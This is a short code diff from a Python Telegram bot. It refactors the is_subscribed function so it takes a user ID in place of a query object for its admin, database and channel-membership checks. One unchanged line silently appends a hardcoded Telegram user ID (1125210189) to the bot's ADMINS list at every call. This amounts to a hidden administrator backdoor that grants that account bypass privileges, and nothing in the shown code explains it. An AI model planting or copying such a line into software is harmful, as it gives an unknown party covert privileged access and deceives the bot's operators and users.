@@ -50,18 +50,18 @@ class temp(object):
     SEND_ALL_TEMP = {}
     KEYWORD = {}
 
-async def is_subscribed(bot, query):
+async def is_subscribed(bot, userid):
 
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
-    elif query.from_user.id in ADMINS:
+    elif userid in ADMINS:
         return True
 
 
     if db2().isActive():
-        user = await db2().get_user(query.from_user.id)
+        user = await db2().get_user(userid)
         if user:
             return True
         else:
@@ -71,7 +71,7 @@ async def is_subscribed(bot, query):
         return True
 
     try:
-        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+        user = await bot.get_chat_member(AUTH_CHANNEL, userid)
     except UserNotParticipant:
         return False
     except Exception as e:
